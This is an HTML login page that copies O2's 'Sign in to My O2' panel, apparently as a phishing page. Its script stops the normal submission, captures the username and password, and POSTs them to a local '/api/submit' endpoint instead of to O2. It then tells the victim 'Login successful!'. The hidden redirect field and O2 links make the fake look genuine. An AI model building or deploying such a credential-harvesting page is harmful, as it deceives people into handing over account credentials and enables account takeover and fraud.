<body class="serviceMsg desktop digital-id">
  <div class="wrapper" id="o2-page-wrapper">
    <!-- Header, Navigation, and Other Content -->
    <header>
      <!-- Your existing header and navigation code -->
    </header>

    <!-- Main Content -->
    <div class="grid">
      <div class="grid-row bodyText">
        <div class="section-wrap col-3">
          <div id="leftColumn" class="login-panel">
            <div class="formPanel">
              <div class="panelContentWrap">
                <h2 class="desktopview">Sign in to My O2</h2>
                <form id="loginForm" name="loginForm" accept-charset="utf-8">
                  <input type="hidden" name="sendTo" value="https://accounts.o2.co.uk/?checkproduct=true" />
                  <fieldset>
                    <label for="username">Username (usually your email address)</label>
                    <input type="text" name="username" required="required" id="username" maxlength="320" autocomplete="on" />
                    <label for="password">Password</label>
                    <input type="password" name="password" required="required" id="password" maxlength="320" autocomplete="off" />
                  </fieldset>
                  <fieldset class="rememberMe">
                    <input type="checkbox" value="true" name="remember_me" id="rememberMe" />
                    <label for="rememberMe">Remember my username</label>
                  </fieldset>
                  <input id="signInButton" type="submit" value="Sign in" class="rounded-button" />
                </form>
                <div class="help">
                  <p class="align-bottom">
                    <a id="forgottenDetails" href="https://accounts.o2.co.uk/resetpassword/selectusername" class="product-cta">Forgotten your username or password?</a>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Footer -->
    <footer>
      <!-- Your existing footer code -->
    </footer>
  </div>

  <!-- Add JavaScript for Form Submission -->
  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault(); // Prevent the default form submission

      // Get the email and password values from the form
      const email = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      try {
        // Send the data to the /api/submit endpoint
        const response = await fetch('/api/submit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ email, password }), // Send data as JSON
        });

        // Check if the request was successful
        if (response.ok) {
          alert('Login successful!'); // Show success message
        } else {
          alert('An error occurred.'); // Show error message
        }
      } catch (error) {
        console.error('Error:', error);
        alert('An unexpected error occurred.');
      }
    });
  </script>
